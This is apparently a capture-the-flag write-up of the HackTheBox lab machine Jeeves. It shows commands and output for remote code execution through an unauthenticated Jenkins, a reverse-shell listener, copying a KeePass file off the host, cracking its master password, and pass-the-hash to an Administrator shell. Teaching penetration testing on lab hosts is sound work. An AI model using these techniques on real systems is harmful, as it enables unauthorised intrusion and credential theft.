[HTB: Jeeves](#)




![](/img/jeeves-cover.png)

Jeeves was first released in 2017, and I first solved it in 2018. Four
years later, it's been an interesting one to revisit. Some of the
concepts seem not that new and exciting, but it's worth remembering that
Jeeves was the first to do them. I'll start with a webserver and find a
Jenkins instance with no auth. I can abuse Jenkins to get execution and
remote shell. From there, I'll find a KeePass database, and pull out a
hash that I can pass to get execution as Administrator. root.txt is
actually hidden in an alternative data stream.

### nmap

`nmap` finds four open TCP ports, HTTP (80), SMB/RPC (135/445), and
another Jetty webserver (50000):

SMB scripts show it's Windows 7-10, and the [IIS
version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions)
suggests Windows 10 or Server 2016.

### Website - TCP 80

#### Site

The webserver returns a "Ask Jeeves" looking search engine:

![](/img/image-20220412175239965.png)

Submitting anything is a GET request to `/error.md`. The value in the
"Search here..." box isn't even sent. The result is a simple page with a
single image:



    <img src="jeeves.PNG" width="90%" height="100%">



It looks like a ASP.NET error message about failing to connect to MSSQL:

![](/img/image-20220412175426757.png)

This form doesn't seem useful.

#### Tech Stack

The response headers show the page is hosted by IIS, but not much else
of interest:

I'm not able to connect to SMB without creds:

### HTTP - TCP 50000

#### Site

The page on 50000 returns an error as well:

![](/img/image-20220412180522711.png)

#### Tech Stack

`feroxbuster` by default uses the
[SecLists](https://github.com/danielmiessler/SecLists)
`raft-medium-directories.txt` wordlist, which is a pretty good
approximation for what I should expect to find on HackTheBox today. Back
in 2017, the go to wordlist was the
[dirbuster](https://hackbbs.org/wordlists/dirbuster/)
`directory-list-2.3-medium.txt` list. Looking at my notes from
originally solving this box, that list finds something:



    root@kali# gobuster -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php.md

    /askjeeves (Status: 302)



In HTB, for machines released recently, the
`raft-medium-directories.txt` list is probably good enough... but it's a
good reminder that in the real world (and on older HTB machines), it's
worth trying different wordlists.

#### /askjeeves

This page is an instance of Jenkins:

![](/img/image-20220412191421029.png)

## Shell as kohsuke

### Execution Via Job \[1\]

#### Create a Job

I recently ran into using Jenkins to get execution for the
[Object](/htb-object.md#shell-as-oliver) machine from the
HTB Uni CTF 2021. I'll follow similar steps here. First, I'll click "New
Item", and on the next form give it a name (doesn't matter what, I'll
just use "0xdf"), and select "Freestyle Project" as the type.

The next form presents the configuration options:

![](/img/image-20220412191920059.png)

At the bottom, I'll "Add build step", and select "Execute Windows batch
command":

![](/img/image-20220412192001348.png)

I'll start with `cmd /c whoami`:

![](/img/image-20220412192035783.png)

I'll click save, which takes me back to a dashboard for the job.

#### Run Job

In Object, Jenkins was configured such that "Build Now" was not an
option. Here, it is:

![](/img/image-20220412192349820.png)

Clicking that, it shows up in the build history (I clicked twice, oops):

![](/img/image-20220412192445024.png)

Clicking on one and going to "Console Output" shows the results of the
command:

![](/img/image-20220412192510899.png)

### Execution Via Script Console \[2\]

From the main dashboard left menu, I'll click "Manage Jenkins":

![](/img/image-20220413062516108.png)

A little over halfway down is "Script Console":

![](/img/image-20220413062543265.png)

It gives a box to put in Groovy scripts. To run a command on the host,
I'll enter `println "cmd.exe /c whoami".execute().text`, and click run:

![](/img/image-20220413063418051.png)

### Shell

I'll jump into [revshells.com](https://www.revshells.com/) and build a
shell. I've had really good luck lately with Powershell #3 (Base64), so
I'll use that one.

To get a shell via the job, I'll click "Configure" to get back to the
job configuration, and update the batch command:

![](/img/image-20220412192838994.png)

Or I can paste that directly into the Script Console:

![](/img/image-20220413063615149.png)

Either way, I'll run the listener with `rlwrap` to make the shell more
usable, and then run the job. There's a connection at the listener:



    oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 445
    Listening on 0.0.0.0 445
    Connection received on 10.10.10.63 49676
    whoami
    jeeves\kohsuke
    PS C:\Users\Administrator\.jenkins\workspace\0xdf>



It doesn't show the prompt until after the first command, but once I see
"Connection received on \[Jeeves IP\]", I know it's there.

Despite running as kohsuke, I'm in a directory in the Administrator's
home directory. Still, I can't access anything else in here. I'll visit
kohsuke's desktop, and grab `user.txt`:



    PS C:\Users\kohsuke\desktop> cat user.txt
    e3232272************************



## Shell as Administrator

### Enumeration

There are no other users on the box besides administrator, so that's the
clear next target:



    PS C:\Users> dir


        Directory: C:\Users


    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----        11/3/2017  11:07 PM                Administrator
    d-----        11/5/2017   9:17 PM                DefaultAppPool
    d-----        11/3/2017  11:19 PM                kohsuke
    d-r---       10/25/2017   4:46 PM                Public 

    PS C:\Users> net user

    User accounts for \\JEEVES

    -------------------------------------------------------------------------------
    Administrator            DefaultAccount           Guest                    
    kohsuke                  
    The command completed successfully.



Looking around kohsuke's home directory, there's a single file in the
`Documents` folder:



    PS C:\Users\kohsuke\Documents> ls


        Directory: C:\Users\kohsuke\Documents


    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----        9/18/2017   1:43 PM           2846 CEH.kdbx 



That's a [KeePass](https://keepass.info/) database, a local password
manager.

### Exfil

On a Linux host, I could just use `nc` to send this back. On Windows,
it's a bit tricker. Still, there's a webserver here, so I'll copy the
file into that directory:



    PS C:\Users\Administrator\.jenkins\workspace\0xdf> copy \users\kohsuke\Documents\CEH.kdbx .
    PS C:\Users\Administrator\.jenkins\workspace\0xdf> ls


        Directory: C:\Users\Administrator\.jenkins\workspace\0xdf


    Mode                LastWriteTime         Length Name                                                                  
    ----                -------------         ------ ----                                                                  
    -a----        9/18/2017   1:43 PM           2846 CEH.kdbx  



Now clicking on "Workspace" in the Jenkins GUI shows the file:

![](/img/image-20220412205920650.png)

Once I download it, I'll delete it from the directory:



    PS C:\Users\Administrator\.jenkins\workspace\0xdf> del CEH.kdbx 



### Crack Master Password

With KeePass, to get things out of the database, I need the master
password. I'll use the `keepass2john` script to create a hash the
represents the password:



    oxdf@hacky$ keepass2john CEH.kdbx 
    CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
    oxdf@hacky$ keepass2john CEH.kdbx > CEH.kdbx.hash



I'll use `hashcat` to crack it. I'll need the `--user` flag as the hash
starts with `[username]:`. `hashcat` now can automatically detect the
hash type (most of the time), and it works here:



    $ /opt/hashcat-6.2.5/hashcat.bin CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user
    ...[snip]...
    Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
    The following mode was auto-detected as the only one matching your input hash:

    13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
    ...[snip]...
    $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
    ...[snip]...



The password is "moonshine1".

### Extract Passwords

I'll use `kpcli` to extract passwords from the KeePass database. To
connect, I just give it the `kdb` file and enter the master password
when prompted:



    oxdf@hacky$ kpcli --kdb CEH.kdbx
    Please provide the master password: *************************

    KeePass CLI (kpcli) v3.1 is ready for operation.
    Type 'help' for a description of available commands.
    Type 'help <command>' for details on individual commands.

    kpcli:/>



`find .` will list all the passwords:



    kpcli:/> find .
    Searching for "." ...
     - 8 matches found and placed into /_found/

### Try Passwords

I'll collect the ones that look like passwords into a list:



    oxdf@hacky$ cat passwords 
    12345
    S1TjAtJHKsugh9oC4VZl
    pwndyouall!
    F7WhTrSFDKB6sxHU1cUn
    lCEUnYPjNfIuPZSzOySA
    Password



I'll pass that to `crackmapexec` for the Administrator user, but none
work:



    oxdf@hacky$ crackmapexec smb 10.10.10.63 -u Administrator -p passwords 
    SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
    SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:12345 STATUS_LOGON_FAILURE 
    SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
    SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:pwndyouall! STATUS_LOGON_FAILURE 
    SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
    SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
    SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:Password STATUS_LOGON_FAILURE



### Try Hash

#### LM and NT Hashes

The first entry in the KeePass, "Backup", provided what looks like a
Windows hash:



    aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00



Windows will show hashes in the format `LM Hash:NT Hash`. LM is the much
less secure hash format used in legacy Windows systems. It's typically
not used, but kept around for backwards compatibility. Many times, the
LM hash for the blank password is stored, which is ignored by Windows
but allows the field not to be empty. `aad3b435b51404eeaad3b435b51404ee`
is the LM hash of the empty password.

#### Crack Failures

Because there's no salting in NT hashes, I can submit them to
[CrackStation](https://crackstation.net/), where they store *tons* of
hashes for known passwords. It finds the empty LM hash, but doesn't have
anything for the NT hash:

#### Pass The Hash

Because of how Windows handles authentication, when you enter your
password, it's actually the hash of the password that the client sends
to Windows. That means with the right client, you can just pass that
hash directly. `crackmapexec` is one of those clients that can take a
hash and try to auth with it, and it works:



    oxdf@hacky$ crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00                                                    
    SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
    SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)



Now only is it successful, but it shows `(Pwn3d!)`, which means this
account has admin access.

### Shell

With valid admin creds, I'll use `psexec.py` to get a shell:



    oxdf@hacky$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe

### root.txt

On Administrator's desktop, there's no `root.txt`, but rather a
`hm.txt`:



    C:\Users\Administrator\Desktop> dir
     Volume in drive C has no label.
     Volume Serial Number is BE50-B1C9

     Directory of C:\Users\Administrator\Desktop

    11/08/2017  10:05 AM    <DIR>          .
    11/08/2017  10:05 AM    <DIR>          ..
    12/24/2017  03:51 AM                36 hm.txt
    11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
                   2 File(s)            833 bytes
                   2 Dir(s)   7,519,215,616 bytes free
                   
    C:\Users\Administrator\Desktop> type hm.txt
    The flag is elsewhere.  Look deeper.



On thing to check in CTFs is for alternative data streams, which can be
seen in `dir` with `/R`. `hm.txt` has a stream named `root.txt`:



    C:\Users\Administrator\Desktop> dir /R
     Volume in drive C has no label.
     Volume Serial Number is BE50-B1C9

     Directory of C:\Users\Administrator\Desktop

    11/08/2017  10:05 AM    <DIR>          .
    11/08/2017  10:05 AM    <DIR>          ..
    12/24/2017  03:51 AM                36 hm.txt
                                        34 hm.txt:root.txt:$DATA
    11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
                   2 File(s)            833 bytes
                   2 Dir(s)   7,519,215,616 bytes free



The stream can be read by piping it into `more`:



    C:\Users\Administrator\Desktop> more < hm.txt:root.txt
